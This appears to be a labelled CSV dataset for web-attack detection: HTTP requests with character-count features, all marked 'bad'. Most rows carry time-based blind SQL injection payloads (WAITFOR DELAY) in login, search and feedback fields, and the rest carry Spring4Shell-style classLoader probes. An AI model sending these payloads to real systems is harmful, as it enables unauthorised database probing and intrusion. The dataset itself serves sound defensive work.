method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/search.jsp?query=ZAP%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,50,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,70,0,2,bad
GET,/survey_questions.jsp?step=d%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,58,0,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&btnSubmit=Login,2,0,1,0,5,0,0,0,0,8,62,3,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,5,0,0,0,0,104,0,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,153,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,9,0,0,0,0,114,0,2,bad
GET,/search.jsp?query=ZAP%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,52,0,2,bad
GET,/static/index.jsp?content=personal_checking.htm%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,76,0,2,bad
GET,/survey_questions.jsp?step=d%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,57,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,72,0,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&btnSubmit=Login,3,0,1,0,6,0,0,0,0,8,64,3,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,5,0,0,0,0,104,0,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,155,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,,2,0,0,1,7,0,0,0,0,109,0,2,bad
GET,/static/index.jsp?content=personal_checking.htm%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,78,0,2,bad
GET,/search.jsp?query=ZAP%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,52,0,2,bad
GET,/survey_questions.jsp?step=d%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,59,0,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&btnSubmit=Login,2,1,1,0,6,0,0,0,0,8,64,3,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,72,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,104,0,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,155,2,bad
GET,/static/index.jsp?content=personal_checking.htm%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,78,0,2,bad
GET,/search.jsp?query=ZAP%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,,2,0,0,1,4,0,0,0,0,47,0,2,bad
GET,/survey_questions.jsp?step=d%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,59,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,71,0,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28&btnSubmit=Login,2,0,0,1,4,0,0,0,0,8,59,3,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,106,0,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,0,1,11,0,0,0,0,13,150,2,bad
GET,/static/index.jsp?content=personal_checking.htm%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,,2,0,0,1,4,0,0,0,0,73,0,2,bad
GET,/survey_questions.jsp?step=d%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,,2,0,0,1,4,0,0,0,0,54,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,73,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,106,0,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,5,0,0,0,0,8,60,3,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,73,0,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,5,0,0,0,0,8,61,3,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,0,1,0,5,0,0,0,0,105,0,2,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,,2,0,0,1,4,0,0,0,0,68,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,3,0,1,0,6,0,0,0,0,107,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,,2,1,1,0,6,0,0,0,0,107,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,,2,0,0,1,4,0,0,0,0,102,0,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%29+%22+WAITFOR+DELAY+%270%3A0%3A1%27+--+,2,1,1,0,6,0,0,0,0,12,61,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,5,0,0,0,0,12,61,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,6,0,0,0,0,12,63,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,6,0,0,0,0,12,63,2,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,2,0,0,1,4,0,0,0,0,12,58,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,151,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,3,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,5,0,0,0,0,8,61,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,1,1,0,12,0,0,0,0,13,152,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,5,0,0,0,0,8,61,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,6,0,0,0,0,8,63,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,154,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,6,0,0,0,0,8,63,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,154,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,5,0,0,0,0,8,62,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,153,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,155,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,6,0,0,0,0,8,64,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,155,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,6,0,0,0,0,8,64,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,0,1,11,0,0,0,0,13,150,2,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,2,0,0,1,4,0,0,0,0,8,59,3,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,151,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,3,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,2,1,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,154,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,154,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,153,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,155,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&comments=&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,155,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28&comments=&submit=+Submit+,2,0,0,1,11,0,0,0,0,13,150,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,151,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,3,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,2,1,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,154,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,154,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,2,0,1,0,12,0,0,0,0,13,153,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,3,0,1,0,13,0,0,0,0,13,155,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+&submit=+Submit+,2,1,1,0,13,0,0,0,0,13,155,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28&submit=+Submit+,2,0,0,1,11,0,0,0,0,13,150,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit++WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,12,0,0,0,0,13,151,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,12,0,0,0,0,13,152,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,13,0,0,0,0,13,154,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,13,0,0,0,0,13,154,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29%29+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,0,1,0,12,0,0,0,0,13,153,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29%29+%27+WAITFOR+DELAY+%270%3A0%3A15%27+--+,3,0,1,0,13,0,0,0,0,13,155,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29%29+%22+WAITFOR+DELAY+%270%3A0%3A15%27+--+,2,1,1,0,13,0,0,0,0,13,155,2,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%29+WAITFOR+DELAY+%270%3A0%3A15%27+%28,2,0,0,1,11,0,0,0,0,13,150,2,bad
GET,/doLogin?class.module.classLoader.DefaultAssertionStatus=nonsense,uid=ZAP&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,65,33,1,bad
GET,/?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,58,0,0,bad
GET,/doSubscribe?class.module.classLoader.DefaultAssertionStatus=nonsense,txtEmail=ZAP&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,69,32,0,bad
GET,/sendFeedback?class.module.classLoader.DefaultAssertionStatus=nonsense,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,70,124,0,bad
GET,/index.jsp,uid=ZAP&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,10,33,1,bad
GET,/Documents?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,67,0,0,bad
POST,/,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,1,56,0,bad
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+&class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,7,0,0,0,0,13,181,0,bad
POST,/doSubscribe,txtEmail=ZAP&btnSubmit=Subscribe&class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,12,89,0,bad
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login&class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,8,90,1,bad
POST,/Documents,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,10,56,0,bad
GET,/Documents/JohnSmith?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,77,0,0,bad
GET,/Documents/JohnSmith/VoluteeringInformation.pdf?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,104,0,0,bad
GET,/Documents/JohnSmith/subscribe.jsp?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,91,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=US&class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,99,0,0,bad
GET,/Documents/JohnSmith/cgi.exe?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,85,0,0,bad
GET,/Documents/JohnSmith/index.jsp?content=personal.htm&class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,108,0,0,bad
POST,/Documents/JohnSmith,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,20,56,0,bad
POST,/Documents/JohnSmith/VoluteeringInformation.pdf,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,47,56,0,bad
POST,/Documents/JohnSmith/cgi.exe,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,28,56,0,bad
POST,/Documents/JohnSmith/subscribe.jsp,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,34,56,0,bad
POST,/Documents/JohnSmith/index.jsp?content=personal.htm,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,51,56,0,bad
GET,/default.jsp?content=security.htm&class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,90,0,0,bad
GET,/cgi.exe?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,65,0,0,bad
GET,/admin/clients.xls?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,75,0,1,bad
GET,/admin?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,63,0,1,bad
GET,/default.jsp?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,69,0,0,bad
GET,/disclaimer.htm?url=http://www.netscape.com&class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,100,0,0,bad
GET,/feedback.jsp?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,70,0,0,bad
GET,/high?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,62,0,0,bad
POST,/Privacypolicy.jsp?sec=Careers&template=US,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,42,56,0,bad
GET,/high_yield_investments.htm?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,84,0,0,bad
POST,/high,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,5,56,0,bad
POST,/default.jsp,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,12,56,0,bad
POST,/default.jsp?content=security.htm,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,33,56,0,bad
POST,/feedback.jsp,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,13,56,0,bad
POST,/cgi.exe,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,8,56,0,bad
POST,/high_yield_investments.htm,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,27,56,0,bad
GET,/images?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,64,0,0,bad
POST,/admin/clients.xls,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,18,56,1,bad
POST,/admin,class.module.classLoader.DefaultAssertionStatus=nonsense,0,0,0,0,0,0,0,0,0,6,56,1,bad
GET,/images/?class.module.classLoader.DefaultAssertionStatus=nonsense,,0,0,0,0,0,0,0,0,0,65,0,0,bad
